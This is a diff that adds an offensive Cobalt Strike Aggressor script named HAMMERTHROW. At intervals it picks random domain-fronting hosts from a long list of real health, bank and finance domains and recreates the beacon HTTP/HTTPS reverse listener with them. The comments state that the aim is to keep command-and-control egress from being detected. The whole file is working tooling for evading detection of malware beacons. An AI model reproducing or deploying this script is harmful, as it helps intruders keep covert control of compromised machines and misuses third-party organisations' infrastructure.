@@ -1,0 +1,135 @@
+# HAMMERTHROW
+# Rotates domain fronting domains for beacon HTTPS listener every 5 minutes.
+# This ensures that your beacon domains are not limited to one domain, and is actively changing to avoid new egress beacons from being detected.
+
+# Quiet mode, no logging in event log
+$quiet = $False;
+
+global('@domains');
+
+# Set a domain list you want to use here
+@domains = @("abmail.itriagehealth.com","about.itriagehealth.com","app.dosehealthcare.com","appmanager.linkhealth.com","appmanager-test.linkhealth.com","appmanager-stage.linkhealth.com","assets.healthcare.com","assets.stg.healthcare.com","assets.verticalhealth.net","assets.westfieldhealth.com","besthealth.save.ca","bhn.burdhealth.com","careers.gdhealth.com","cdn1.healthians.com","cdn2.beyondhealthy.ca","cdn2.healthians.com","cdn3.beyondhealthy.ca","cdn3.healthians.com","cdn4.healthians.com","cdn.ahchealthenews.com","cdn.ahealthypassion.com","cdn.beyondhealthy.ca","cdn.confer.health","cdn.crickethealth.com","cdn-css.health.com","cdn.healthcare.com","cdn.healthcare.se","cdn.healthguru.com","cdn.healthscion.com","cdn.healthyplace.com","cdn.healthytraditions.com","cdn-img.health.com","cdn-js.health.com","cdn.kivihealth.com","cdn.passporthealthglobal.com","cdn.passporthealthusa.com","cdn.patientfocus.myhealthfeed.com","cdn.smart-monitor.myhealthfeed.com","cdn-stage.linkhealth.com","cdn.universityhealthnews.com","cf.goziohealth.com","cf.healthcare.com","claims.linkhealth.com","client.healthiestyou.com","connect.uclahealth.org","demo.healthjoiner.com","desktop.healthchat.md","developer.linkhealth.com","developer-stage.linkhealth.com","faq.wahealthplanfinder.org","files.kivihealth.com","garciniacambogiaearthshealthie.simplesite.com","go.dosehealthcare.com","healthbeautyexample.upplication.com","health.facty.com","healthelife.healtheintent.com","healthhub.medibankhealth.com.au","healthpartneradvantage.com","health.tvbs.com.tw","healthy-mom-daily.com","healthymatrix.myisagenix.com","hsafacts.healthequity.com","ibmsol.integrahealth.com","icrm-static.hospitals.healthgrades.com","images.eqcohealth.io","images.smarthealth.me","imshealth.e.sparkpost.com","jobs.atlantichealth.org","media-dev.healthination.com","media.elsevierhealth.com.au","media.healthdirect.org.au","media.healthination.com","media.healthiq.com","mednet.uclahealth.org","member.bluezonehealth.co.uk","member.healthiestyou.com","nahis.animalhealthaustralia.com.au","namp.animalhealthaustralia.com.au","new.ccihealth.org","portal.altegrahealth.com","portal.apostrophehealth.com","portal.burdhealth.com","prodstaticcdn.stanfordhealthcare.org","provider.apostrophehealth.com","provider.linkhealth.com","provider-stage.linkhealth.com","requestinfo.publichealthonline.gwu.edu","resources.static.evaliahealth.com","secure.menshealth.com","secure.womenshealthmag.com","social.drivemyhealth.com","sponsored.health.com","ssl.sociohealth.co.jp","staging-about.itriagehealth.com","static.healthcare.com","static.healthination.com","stg-images.eqcohealth.io","student.healthiestyou.com","styles.smarthealth.me","subscription-assets.health.com","tiads.health.com","tokensale.simplyvitalhealth.com","uat.healthepetsnow.com","uatstaticcdn.stanfordhealthcare.org","ushealthadvisors.vivialsite.net","wacohealthandwellness.smugmug.com","www.acadiahealthcarecareers.com","www.africahealthexhibition.com","www.arabhealthonline.com","www.baldurhealthcare.com","www.buildinghealthcare-exhibition.com","www.careersatmainehealth.org","www.drivemyhealth.com","www.h1healthcare.com","www.healthandsafety-jobs.co.uk","www.health.com","www.healthbeckon.com","www.healthelivingfilm.com","www.healthevoices16.com","www.healthcombined.com","www.healthrecruitmentfair.com","www.healthystockport.co.uk","www.ihealthkonnect.com","www.lakelandbehavioralhealth.com","www.lusciniahealth.com","www.manateehealthcaresystem.com","www.mangohealth.com","www.massivehealth.com","www.medstarhealthjobs.org","www.melonhealth.com","www.peacehealth.org","www.platformqhealth.com","www.saudihealthexhibition.com","www.sesamehealthyplay.org","www.sociohealth.co.jp","www.soleohealth.com","www.southtexashealthsystem.com","www.swhealthcaresystem.com","www.teamhealth.com","www.uclahealthcareers.org","www.usanahealth.net","www.valleyhealthsystemlv.com","admin.interbankbenefit.pe","agl.medibank.com.au","arkansas.protectmybank.com","assets.nieuwsbank.nl","bank.coveredsec.com","bankia-mobile.brandcrumb.com","bank.smugmug.com","bebetter.medibank.com.au","beta.cdn.bankersalmanac.com","brokercdn2.pnbank.info","brokercdn5.pnbank.info","careers.bankofireland.com","careers.cobank.com","cdn.amarbank.co.id","cdn.bankersalmanac.com","cdn.bankforeclosuressale.com","cdn.banksalad.com","cdn.foodbank.io","cdn.nieuwsbank.nl","cdn.southbankresearch.com","cdn.spankbank.io","cem2.lloydsbank.co.uk","certification.protectmybank.com","cf.sports.mb.softbank.jp","content-medibank.ritualize.com","corporate.medibank.com.au","databank.501st.com","dbanksphotography.smugmug.com","developer.softbankrobotics.com","dev.libertybank.net","docs.selfbank.es","donbanka.smugmug.com","duxyphotobank.smugmug.com","ebanking.ekuantia.es","fu11.my.softbank.jp","healthhub.medibankhealth.com.au","homebanking.hiway.org","images.spankbank.io","irishlab.cytobank.org","ite.verify.kiwibank.co.nz","leftbankhome.smugmug.com","martin-windebank.smugmug.com","members.medibank.com.au","merchants.firstbanks.com","merch.bankofamerica.com","mtbank.cdn.online-trading-solutions.com","myautoloan.broadway.bank","myburbank.smugmug.com","oncard.zionsbank.com","p2bkunisbank.simplesite.com","ppd-developer.softbankrobotics.com","production-cdn2.patternbank.com","production-cdn1.patternbank.com","production-cdn.patternbank.com","publicdemobankingsample.locationlandingpages.com","reh2-developer.softbankrobotics.com","service.protectmybank.com","showmeopportunities.bankofireland.com","ssl.clickbank.net","stage-my.softbankrobotics.com","stage-store.softbankrobotics.com","stage-www.softbankrobotics.com","static.interbankbenefit.pe","static.medibank.com.au","st.fu11.my.softbank.jp","tedleeeubanks.smugmug.com","test-cdn.amarbank.co.id","verify.kiwibank.co.nz","vip.medibank.com.au","wc.banklotus.com.tw","wc.csbank.com.tw","wc.ksbank.com.tw","wc.ucbank.com.tw","www.bankenberatungszentrum.ch","www.bankmelb.com.au","www.bankofmelbourne.com","www.bankoftampa.com","www.bankofmelbourne.com.au","www.banksa.com.au","www.banksrum.com","www.buddybank.com","www.columbiabankmerchantservices.com","www.greatsouthernbankpaymentsolutions.com","www.interbankbenefit.pe","www.kbankegirls.com","www.libertybank.net","www.medibank.com.au","www.melbank.com","www.nextbank.ph","www.republicbankmerchantservices.com","www.safetydatabank.jp","www.softbankrobotics.com","www.starbanksadventure.com","www.websterbankmerchantservices.com","www.worldbank.org","1706bbc01.adambank.com","100500.rocketbank.ru","admin-staging.coloradok12financialtransparency.com","blog.financialengines.com","branches.onemainfinancial.com","calculators.evenfinancial.com","careers.snifinancial.com","cla.evenfinancial.com","corp.financialengines.com","financialaid.wvu.edu","financialbuilders.truecar.com","financialmarketstoolkit.cliffordchance.com","financialpost.scribblelive.com","financialservices.wvu.edu","financials.morningstar.com","i.financialengines.com","local.gmfinancial.com","m-ink.etradefinancial.com","news.efinancialcareers.com","news.pilotaws.efinancialcareers.com","partnerpage.evenfinancial.com","webstore.efinancialcareers.com","widgets.efinancialcareers.com","widgets.pilotaws.efinancialcareers.com","www.financialedufcu.com","www.paccarfinancial.com.au","www.retailfinancialcareers.com","www.yesplanfinancial.ca","accreditation.wvu.edu","anhs.cusdcreditrecovery.com","api.creditsafebci.com","bridges.cusdcreditrecovery.com","ca.creditcards.com","calprep.cusdcreditrecovery.com","canada.creditcards.com","cdn.creditcards.com","creditunion1.truecar.com","cvhs.cusdcreditrecovery.com","data.kanzen-creditcard.com","dhhs.cusdcreditrecovery.com","image.creditseva.com","images.creditcardcompare.com.au","lab-uat.credit-suisse.com","schs.cusdcreditrecovery.com","shs.cusdcreditrecovery.com","sjhhs.cusdcreditrecovery.com","ths.cusdcreditrecovery.com");
+
+$size = size(@domains);
+
+# Set how many domains you want to use for beaconing. Don't put too many at once
+$num = 3;
+$start = $True;
+
+# heartbeat_10s
+# heartbeat_5m
+# Up to you :)
+
+on heartbeat_10s {
+	if ($start == $True){
+		@cactus = @();
+		for ($a = 0; $a < $num; $a++){
+			# get a random domain from the list
+			$dom = rand(@domains);
+
+			# if it exists, keep generating a random one until we get a unique one not already on the list.
+			if ($dom in @cactus){
+				while($dom in @cactus){
+					$dom = rand(@domains);
+				}
+			}
+			# Add to cactusfront
+			add(@cactus, $dom);
+		}
+
+		if ($quiet == $False){
+			elog("\cB[+] HAMMERTHROW rotating domains:");
+		}
+
+		# Lucky first one will be the stager
+		if ($quiet == $False){
+			elog("	\cB[STAGER] \c9" . @cactus[0]);
+		}
+
+		# Rest will be the beaconing domains
+		$domStr = "";
+		for ($a = 1; $a < $num; $a++){
+			$domStr = $domStr . @cactus[$a] . ",";
+		}
+		$domStr = substr($domStr, 0, -1);
+		if ($quiet == $False){
+			elog("	\cB[BEACON] \c9" . $domStr);
+		}
+	}
+
+	$listener = "";
+	$type = "";
+	foreach $name (listeners()) {
+		$a = listener_describe($name);
+		$b = indexOf($a, "beacon_https/reverse_https", 0);
+		$c = indexOf($a, "beacon_http/reverse_http", 0);
+
+		
+		
+		if ($b || $c){
+			$listener = $name;
+			if ($b){
+				$type = "https";
+			}
+			else{
+				$type = "http";
+			}
+
+			$portpos = indexOf($a, ":", -10);
+			$port = substr($a, $portpos);
+			
+			$portpos = indexOf($port, ")");
+			$port = substr($port, 0, $portpos);
+
+			$port = strrep($port, ":", "");
+		}
+	}
+
+	
+	if ($listener -eq ""){
+		elog("\c4[ERROR] Cannot discover egress listener, please restart agent when an egress listener is created over HTTP or HTTPS");
+	}
+	else{
+		if ($quiet == $False){
+			elog("\cB[*] Detected listener name: \c9   " . $listener . " ( $+ $type $+ : $+ $port $+ ) \r\n");
+		}
+	}
+
+	# delete existing listener
+	# listener_delete($listener);
+
+	# create new listener
+	# $1 = name
+	# $2 = payload type
+	# $3 = host
+	# $4 = port
+	# $5 = beacons
+	if ($type == "https"){
+		listener_create($listener, "windows/beacon_https/reverse_https", @cactus[0], $port, $domStr);
+	}
+	else{
+		listener_create($listener, "windows/beacon_http/reverse_http", @cactus[0], $port, $domStr);
+	}
+
+}
+
+
+
+on ready {
+    elog("\HAMMERTHROW rotations are now initiated");
+    $start = $True;
+    if ($num > $size){
+    	elog("\c4[ERROR] The selection number of domains is larger than the number of domains supplied in the list");
+    	$start = $False;
+    }
+
+    if ($num < 2){
+    	elog("\c4[ERROR] We need at least a total list of 2 domains, one for the stager, and one for beaconing");
+    	$start = $False;
+    }
+
+    # 
+
+    elog("\c8[+] A total of " . $size . " domains loaded");
+    
+}
